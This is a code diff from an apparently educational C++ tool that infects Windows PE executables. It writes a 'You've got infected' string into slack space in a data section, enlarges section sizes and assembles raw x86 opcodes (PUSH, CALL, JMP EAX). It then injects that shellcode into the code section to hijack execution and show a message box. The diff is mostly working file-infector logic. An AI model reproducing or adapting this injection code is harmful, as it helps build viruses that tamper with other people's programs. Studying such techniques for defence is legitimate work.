@@ -197,15 +197,15 @@ vector<int> addImportFunctions() {
     int sectionAlignment = getValueOfField("sectionAlignment", offsetOfPE);
     int firstOffsetImportSection = offsetInDataDicrectory["rawAddressImportSection"];
     int lastOffsetImportSection = firstOffsetImportSection + sizeOfImportSection - 1;
-    printf("firstOffsetImportTable: %.8X\t\t", firstOffsetImportTable);
-    printf("lastOffsetImportTable: %.8X\t\t\n\n", lastOffsetImportTable);
-    printf("sizeOfImportSection: %.8X\n\n", sizeOfImportSection);
-    printf("firstOffsetImportSection: %.8X\n\n", firstOffsetImportSection);
-    printf("lastOffsetImportSection: %.8X\n\n", lastOffsetImportSection);
-    printf("spaceNeed: %.8X\n\n", spaceNeed);
+    // printf("firstOffsetImportTable: %.8X\t\t", firstOffsetImportTable);
+    // printf("lastOffsetImportTable: %.8X\t\t\n\n", lastOffsetImportTable);
+    // printf("sizeOfImportSection: %.8X\n\n", sizeOfImportSection);
+    // printf("firstOffsetImportSection: %.8X\n\n", firstOffsetImportSection);
+    // printf("lastOffsetImportSection: %.8X\n\n", lastOffsetImportSection);
+    // printf("spaceNeed: %.8X\n\n", spaceNeed);
     int startOffset = lastOffsetImportSection - spaceNeed + 1;
     startOffset = (startOffset / 16) * 16;
-    printf("startOffset: %.8X\n", startOffset);
+    // printf("startOffset: %.8X\n", startOffset);
 
     //@ Must keep this order of getting data
     vector<int> dataOfIID = getRawValueFromFileData(firstOffsetImportTable, IIDSpace);
@@ -273,17 +273,80 @@ int getOffsetOfCodeSection() {
     return 0;
 }
 
-void addUserDataToDataSection() {
-    vector<int> message = {0x59, 0x6f, 0x75, 0x27, 0x76, 0x65, 0x20, 0x67, 0x6f, 0x74, 0x20, 0x69, 0x6e, 0x66, 0x65, 0x63, 0x74, 0x65, 0x64, 0x00}; // You've got infected
+int getOffsetOfDataSection(vector<int> outputData, int lengthOfData) {
+    int offsetOfPE = getIntValueFromFileData(60, 4); // 0x3C = 60.... 0X3C -> 0X3F
+    int originalEntryPoint = getValueOfField("addressOfEntryPoint", offsetOfPE);
+    int numberOfSection = getValueOfField("numberOfSections", offsetOfPE);
+    int sizeOfOneSection = sizeOfParts["Section"];
+    int offsetOfSection = offsetOfParts["DataDirectories"] + offsetOfPE + sizeOfParts["DataDirectories"];
+    for (int section = 0; section < numberOfSection; section++) {
+        string nameOfSection = getStringFromFileData(offsetOfParts["name"] + offsetOfSection);
+        transform(nameOfSection.begin(), nameOfSection.end(), nameOfSection.begin(), ::tolower);
+        int firstOffsetOfSection = getValueOfField("pointerToRawData", offsetOfSection);
+        int lastOffsetOfSection = firstOffsetOfSection + getValueOfField("sizeOfRawData", offsetOfSection);
+        bool isSectionEmpty = true;
+        for (int i = lastOffsetOfSection - lengthOfData; i <= lastOffsetOfSection; i++) {
+            isSectionEmpty = (outputData[i] == 0) && isSectionEmpty;
+        }
+        if (nameOfSection.find("data") != string::npos && isSectionEmpty) {
+            return offsetOfSection;
+        }
+        offsetOfSection += sizeOfOneSection;
+    }
+    return 0;
+}
+
+vector<int> addUserDataToDataSection(vector<int> rawData) {
+    vector<int> outputData = rawData;
+    int offsetOfPE = getIntValueFromFileData(60, 4); // 0x3C = 60.... 0X3C -> 0X3F
+    int imageBase = getValueOfField("imageBase", offsetOfPE);
+    const int numberOfData = 1;
+    int lengthOfData =  0;
+    vector< vector<int> > userData;
+    vector<int> messageBoxContent = {0x59, 0x6f, 0x75, 0x27, 0x76, 0x65, 0x20, 0x67, 0x6f, 0x74, 0x20, 0x69, 0x6e, 0x66, 0x65, 0x63, 0x74, 0x65, 0x64, 0x00}; // You've got infected
+    lengthOfData += messageBoxContent.size();
+    userData.push_back(messageBoxContent);
+
+    int offsetDataSection = getOffsetOfDataSection(outputData, lengthOfData);
+    if (offsetDataSection == 0) {
+        cout << "Can't Add Data to file \n";
+        canAddCode = false;
+    }
+    int virtualAddressDataSection = getValueOfField("virutalAddress", offsetDataSection);
+    int rawOffsetDataSection = getValueOfField("pointerToRawData", offsetDataSection);
+    int diffRVAandOffsetDataSetion = rawOffsetDataSection - virtualAddressDataSection;
+
+    // Reset VirtualSize of data section
+    int offsetVirtualSize = offsetOfParts["virtualSize"] + offsetDataSection;
+    int rawSizeDataSection = getValueOfField("sizeOfRawData", offsetDataSection);
+    vector<int> newVirtualSizeDataSection = toRVAArray(rawSizeDataSection);
+    for (int i = 0; i < 3; i++) {
+        outputData[offsetVirtualSize + i] = newVirtualSizeDataSection[i];
+    }
+
+    // Add Data
+    int lastOffsetDataSection = rawOffsetDataSection + rawSizeDataSection - 1;
+    int startOffset = lastOffsetDataSection - lengthOfData + 1;
+    startOffset = (startOffset / 16) * 16;
+
+    int index = startOffset;
+    for (int i = 0; i < numberOfData; i++) {
+        RVAuserData.push_back(index - diffRVAandOffsetDataSetion + imageBase);
+        for (int j = 0; j < userData[i].size(); j++) {
+            outputData[index] = userData[i][j];
+            index++;
+        }
+    }
     
+    return outputData;
 }
 
 void initAssemblySyntax() {
-    assemblySyntax["CALL"] = vector<int>() = {255, 21}; // FF15
-    assemblySyntax["MOV"] = vector<int>() = {184}; // B8
-    assemblySyntax["JMP EAX"] = vector<int>() = {255, 224}; // FFE0
-    assemblySyntax["PUSH-BYTE"] = vector<int>() = {106}; // 6A
-    assemblySyntax["PUSH-PTR"] = vector<int>() = {104}; // 68
+    assemblySyntax["CALL"] = vector<int>() = {0xFF, 0x15};
+    assemblySyntax["MOV"] = vector<int>() = {0xB8};
+    assemblySyntax["JMP EAX"] = vector<int>() = {0xFF, 0xE0};
+    assemblySyntax["PUSH-BYTE"] = vector<int>() = {0x6A};
+    assemblySyntax["PUSH-PTR"] = vector<int>() = {0x68};
 }
 
 vector<int> getUserCode() {
@@ -302,8 +365,9 @@ vector<int> getUserCode() {
     code.insert(code.end(), zero.begin(), zero.end());
 
     // @ Push variable 2
-    code.insert(code.end(), assemblySyntax["PUSH-BYTE"].begin(), assemblySyntax["PUSH-BYTE"].end());
-    code.insert(code.end(), zero.begin(), zero.end());
+    code.insert(code.end(), assemblySyntax["PUSH-PTR"].begin(), assemblySyntax["PUSH-PTR"].end());
+    vector<int> RVAMessboxBoxContent = toRVAArray(RVAuserData[0]);
+    code.insert(code.end(), RVAMessboxBoxContent.begin(), RVAMessboxBoxContent.end());
 
     // @ Push variable 1
     code.insert(code.end(), assemblySyntax["PUSH-BYTE"].begin(), assemblySyntax["PUSH-BYTE"].end());
@@ -339,14 +403,14 @@ vector<int> addCode(vector<int> rawData) {
 
     // Reset VirtualSize of code section
     int offsetVirtualSize = offsetOfParts["virtualSize"] + offsetCodeSection;
-    int rawSizeDataCodeSection = getValueOfField("sizeOfRawData", offsetCodeSection);
-    vector<int> newVirtualSizeCodeSection = toRVAArray(rawSizeDataCodeSection);
+    int rawSizeCodeSection = getValueOfField("sizeOfRawData", offsetCodeSection);
+    vector<int> newVirtualSizeCodeSection = toRVAArray(rawSizeCodeSection);
     for (int i = 0; i < 3; i++) {
         outputData[offsetVirtualSize + i] = newVirtualSizeCodeSection[i];
     }
 
     // Add Code
-    int lastOffsetCodeSection = rawOffsetCodeSection + rawSizeDataCodeSection - 1;
+    int lastOffsetCodeSection = rawOffsetCodeSection + rawSizeCodeSection - 1;
     vector<int> userCode = getUserCode();
     int startOffset = lastOffsetCodeSection - userCode.size() + 1;
     startOffset = (startOffset / 16) * 16;
@@ -377,7 +441,10 @@ vector<int> addCodeToFile() {
         return outputData;
     }
 
-    addUserDataToDataSection();
+    outputData = addUserDataToDataSection(outputData);
+    if (!canAddCode) {
+        return outputData;
+    }
     outputData = addCode(outputData);
     return outputData;
 }
